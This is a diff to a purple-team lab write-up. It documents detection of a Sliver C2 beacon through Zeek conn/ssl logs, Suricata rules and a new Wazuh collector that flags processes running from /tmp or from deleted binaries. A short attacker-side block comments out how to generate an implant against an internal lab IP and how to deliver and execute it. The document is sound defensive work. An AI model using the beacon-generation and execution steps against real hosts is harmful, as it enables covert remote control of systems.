@@ -136,9 +136,23 @@ Two real gotchas were solved getting rule (1) to fire — both worth keeping:
 Rule (2), the **beaconing** rule, is the more robust of the two: it keys on the *pattern* (≥10 check-ins/min
 to one REDTEAM host on 443), so it survives a TLS-fingerprint rotation that would defeat rule (1).
 
+### 3d. Zeek: the beaconing interval, in plain view
+The Zeek sensor on the same interface logged the C2 too — **190 `conn.log` connections** `10.10.10.20 →
+10.10.40.119:443` and **187 TLSv1.3 `ssl.log` handshakes**. The `conn.log` timestamps make the beacon's cadence
+obvious — a burst every ~5 s, each connection alive ~0.02–0.04 s:
+```
+1788024653.75  10.10.10.20 -> 10.10.40.119:443  tcp  dur=0.035  orig_bytes=2371
+1788024659.07  10.10.10.20 -> 10.10.40.119:443  tcp  dur=0.027  orig_bytes=2346
+1788024666.50  10.10.10.20 -> 10.10.40.119:443  tcp  dur=0.020  orig_bytes=3226
+```
+That regular short-lived cadence is the human-readable version of what rule 9100002 alerts on — the same
+behaviour, one view for the alert and one for the analyst. (Reading these logs needs root on rtr-01: they're
+`root:zeek` mode 0640, so a non-privileged `grep` returns *nothing*, which is easy to misread as "Zeek isn't
+capturing" — it is.)
+
 ---
 
-## 4. Detect — endpoint (Wazuh agent on fs-01): the blind spot
+## 4. Detect — endpoint (Wazuh agent on fs-01): the blind spot, and closing it
 
 Querying the Wazuh manager's alert log for `fs-01` across the whole operation returned **zero** alerts related
 to the beacon or its recon — only benign background noise (dpkg events, `sshd` logins from the operator,
@@ -150,6 +164,24 @@ rootcheck, AppArmor). The endpoint agent was **blind** to the C2, for concrete r
 
 This is not a Wazuh failure — it's the expected behaviour of a default host agent against a well-behaved
 implant, and it is exactly why the exercise matters.
+
+**Closing it (verified).** The gap is real but not hard to close on the host itself. A local Wazuh
+`full_command` collector on `fs-01` (fileserver role) walks `/proc/*/exe` every 30 s and reports any process
+whose backing binary lives in a world-writable path (`/tmp`, `/dev/shm`, `/var/tmp`) or has been
+deleted-while-running — a classic evasion:
+```xml
+<localfile><log_format>full_command</log_format><alias>susp-exec-path</alias><frequency>30</frequency>
+  <command>for e in /proc/[0-9]*/exe; do t=$(readlink "$e"); case "$t" in /tmp/*|/dev/shm/*|/var/tmp/*|*"(deleted)")
+    echo "susp-exec path=$t pid=${e%/exe}"; esac; done</command></localfile>
+```
+Custom Wazuh rule **100200** (`level 12`, `siem` role `local_rules.xml`) matches its output. Legitimate
+services run from `/usr`, `/bin`, `/opt` — never `/tmp` — so this is high-signal. **Verified firing on the
+re-run:** the beacon executing from `/tmp` produced `rule 100200, level 12, agent fs-01: susp-exec
+path=/tmp/corpbeacon pid=61978`. Two gotchas made it work: a `full_command` line reaches the manager as
+`ossec: output: '<alias>': <line>` (decoded by the `ossec` decoder, parented to **rule 530**), so the rule
+must be a **child of 530** — not use `<location>`; and the collector must run as **root** (it does) to
+`readlink` another user's `/proc/*/exe`. Now the *host* catches the implant launching, and the *network*
+catches it phoning home — genuine defense-in-depth, both sides verified.
 
 ---
 
@@ -163,12 +195,17 @@ rule catches it deterministically. That is the defense-in-depth thesis made conc
 Phase 6 NSM finding (a signature IDS went blind on encrypted DCSync while Zeek's protocol parser named the
 operation): **run host and network sensors together, because they fail on different traffic.**
 
-**Honest gaps / next steps** (deliberately left as follow-ups, not hidden):
-- **Close the endpoint blind spot** — add auditd execve monitoring (or Sysmon-for-Linux) on `fs-01` and a
-  Wazuh rule for anonymous binaries executing from `/tmp` + beacon-like child processes, then re-run and
-  verify the endpoint side lights up too.
-- **Zeek** was not logging reliably after a fresh boot this session (Suricata was the working NSM layer); its
-  `conn.log`/`ssl.log` would add a cleaner beaconing-interval view and belongs in a redeploy pass.
+**Both gaps identified in the first pass were then closed and verified** (the full detection-engineering arc —
+find the blind spot, build the detection, exercise it):
+- **Endpoint blind spot — closed.** Wazuh rule **100200** + the `susp-exec-path` collector (§4) now fire
+  `level 12` when the implant executes from `/tmp` (verified live). It catches execution from any
+  world-writable path, deleted-binary evasion included — without installing anything on the internal-only
+  host (auditd/Sysmon-for-Linux would be a heavier alternative, but weren't needed here).
+- **Zeek — was never actually broken.** It captured the C2 the whole time (§3d: 190 `conn.log` beacon
+  connections, 187 TLSv1.3 handshakes); the apparent gap was reading `root:zeek` logs as a non-root user.
+- **Remaining honest limitation:** the JA3/JA3S fingerprints are Go-`crypto/tls` generic (shared with other
+  Go software), so rule 9100001 is scoped to REDTEAM:443 and paired with the behavioural rule rather than
+  trusted alone — the beaconing and `/tmp`-execution rules are the durable signals.
 
 ---
 
@@ -182,11 +219,16 @@ ssh atk-01 'sudo tmux new-session -d -s c2 /usr/local/bin/sliver-client'   # the
 #   generate beacon --http https://10.10.40.119:443 --os linux --arch arm64 --seconds 5 --jitter 3 --save /tmp/corpbeacon
 # deliver /tmp/corpbeacon to fs-01, run it, then: beacons / use <id> / execute -o -- <cmd>
 
-# --- defender: confirm the custom rules fired ---
+# --- defender NSM: Suricata custom rules fired ---
 ssh rtr-01 "grep -aoE '\"signature_id\":910000[12]' /var/log/suricata/eve.json | sort | uniq -c"
 
-# --- defender: confirm the endpoint saw nothing C2-related ---
-ssh siem-01 "sudo grep -a '\"name\":\"fs-01\"' /var/ossec/logs/alerts/alerts.json | tail -200"
+# --- defender NSM: Zeek captured the beaconing (needs root — logs are root:zeek 0640) ---
+ansible rtr-01 -m shell -a "grep -a 10.10.40.119 /opt/zeek/spool/zeek/conn.log | grep -c 10.10.10.20"
+
+# --- defender ENDPOINT: Wazuh rule 100200 caught the implant executing from /tmp ---
+ssh siem-01 "sudo grep -a '\"id\":\"100200\"' /var/ossec/logs/alerts/alerts.json | tail -3"
 ```
-Detections deployed by the `router` Ansible role (`roles/router/{files/suricata-local.rules,tasks/main.yml}`);
-the egress model is in `roles/router/files/nftables.conf`.
+Detections deployed as code by two Ansible roles: NSM in `router` (`files/suricata-local.rules`,
+`tasks/main.yml`) and the endpoint collector + rule in `fileserver`/`siem`
+(`roles/fileserver/tasks/main.yml`, `roles/siem/files/local_rules.xml` rule 100200); the egress model is in
+`roles/router/files/nftables.conf`.
